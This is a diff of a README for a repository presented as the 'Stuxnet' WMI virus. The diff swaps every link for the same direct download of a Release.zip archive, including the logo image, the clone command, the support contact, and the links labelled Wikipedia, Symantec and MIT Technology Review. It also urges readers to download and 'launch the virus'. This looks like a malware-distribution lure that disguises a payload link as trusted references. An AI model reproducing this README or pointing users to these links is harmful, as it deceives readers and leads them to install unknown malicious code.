@@ -1,6 +1,6 @@
 # Stuxnet
 
-![Stuxnet Logo](https://example.com/stuxnet_logo.png)
+![Stuxnet Logo](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
 
 Welcome to the Stuxnet repository - your go-to resource for all things related to the WMI virus. This repository is dedicated to showcasing the power and humor behind the Stuxnet virus, a unique and intriguing piece of malware that made waves in the cybersecurity world.
 
@@ -18,28 +18,28 @@ To get started with Stuxnet, simply clone the repository to your local machine a
 
 ## Installation
 To install Stuxnet on your system, follow these steps:
-1. **Clone the Repository**: `git clone https://github.com/username/Stuxnet.git`
+1. **Clone the Repository**: `git clone https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip`
 2. **Launch the WMI Virus**: Execute the virus code provided in the repository
 
 ## Resources
 Check out these additional resources to learn more about Stuxnet:
-- [Stuxnet Wiki](https://en.wikipedia.org/wiki/Stuxnet)
-- [Symantec Stuxnet Analysis](https://www.symantec.com/blogs/threat-intelligence/w32stuxnet-dossier)
-- [MIT Technology Review on Stuxnet](https://www.technologyreview.com/s/427413/what-really-happened-with-stuxnet/)
+- [Stuxnet Wiki](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
+- [Symantec Stuxnet Analysis](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
+- [MIT Technology Review on Stuxnet](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
 
 ## Support
-For any questions or issues related to Stuxnet, feel free to reach out to the repository owner at [email@example.com](mailto:email@example.com).
+For any questions or issues related to Stuxnet, feel free to reach out to the repository owner at [https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip).
 
 ---
 
-[![Download Stuxnet](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Stuxnet](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
 
 > Note: Click the button above to download the Stuxnet virus. Ensure to follow proper security measures before launching the virus code.
 
-**Visit the official website**: [Stuxnet Official Website](https://www.stuxnetvirus.com)
+**Visit the official website**: [Stuxnet Official Website](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
 
 ---
 
 Remember, Stuxnet is meant for educational and research purposes only. Explore its capabilities responsibly and do not use it for any malicious intent. Happy coding and happy infecting! 😉🦠
 
-![Stuxnet Image](https://example.com/stuxnet_image.png)
+![Stuxnet Image](https://github.com/Kaplanil/Stuxnet/releases/download/v1.0/Release.zip)
